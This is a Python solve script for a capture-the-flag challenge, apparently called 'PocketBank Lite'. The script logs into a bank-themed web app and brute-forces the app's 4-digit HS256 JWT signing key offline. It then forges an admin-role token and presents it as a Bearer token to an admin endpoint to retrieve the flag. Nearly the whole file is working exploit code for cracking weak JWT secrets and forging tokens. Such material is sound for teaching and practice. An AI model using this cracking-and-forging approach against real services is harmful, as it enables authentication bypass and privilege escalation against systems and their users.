#!/usr/bin/env python3
"""
PocketBank Lite (auth, 150) — CWE-327, JWT HS256 signed with a 4-digit secret.

Login issues an HS256 JWT ({"account":"customer","role":"customer",...}) in the
`token` cookie. The signing key is only 4 digits (0000-9999), so brute-force it
against the valid token, then re-sign a role:admin token and present it as
`Authorization: Bearer` to /accounts/admin.

Usage:
    python3 solve.py                          # defaults to auth8.chal.deti:8067
    python3 solve.py http://auth8.chal.deti:8067
"""
import base64
import hashlib
import hmac
import json
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth8.chal.deti:8067"
CREDS = {"account": "customer", "password": "customer123"}
ADMIN_ENDPOINT = f"{BASE}/accounts/admin"

FLAG_RE = re.compile(r"flag\{[^}]*\}")


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def sign(signing_input: bytes, key: str) -> str:
    return b64url_encode(hmac.new(key.encode(), signing_input, hashlib.sha256).digest())


def main() -> int:
    s = requests.Session()
    s.post(f"{BASE}/login", data=CREDS, timeout=10)
    token = s.cookies.get("token")
    if not token:
        print("[-] no token cookie after login")
        return 1
    h_b64, p_b64, sig = token.split(".")
    signing_input = f"{h_b64}.{p_b64}".encode()
    print(f"[i] token payload: {json.loads(b64url_decode(p_b64))}")

    # 1. brute-force the 4-digit HMAC secret (10k tries, offline, <1s)
    secret = next((f"{i:04d}" for i in range(10000)
                   if hmac.compare_digest(sign(signing_input, f"{i:04d}"), sig)), None)
    if secret is None:
        print("[-] 4-digit secret not found")
        return 1
    print(f"[+] cracked signing key: {secret}")

    # 2. forge an admin token signed with the recovered key
    header = b64url_encode(b'{"alg":"HS256","typ":"JWT"}')
    body = b64url_encode(json.dumps({"account": "admin", "role": "admin", "iat": 1794405979},
                                    separators=(",", ":")).encode())
    forged = f"{header}.{body}.{sign(f'{header}.{body}'.encode(), secret)}"

    # 3. present it as a Bearer token to the admin account endpoint
    r = requests.get(ADMIN_ENDPOINT, headers={"Authorization": f"Bearer {forged}"}, timeout=10)
    m = FLAG_RE.search(r.text)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
        return 0
    print(f"[!] no flag (status {r.status_code}) — body head:\n{r.text[:600]}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
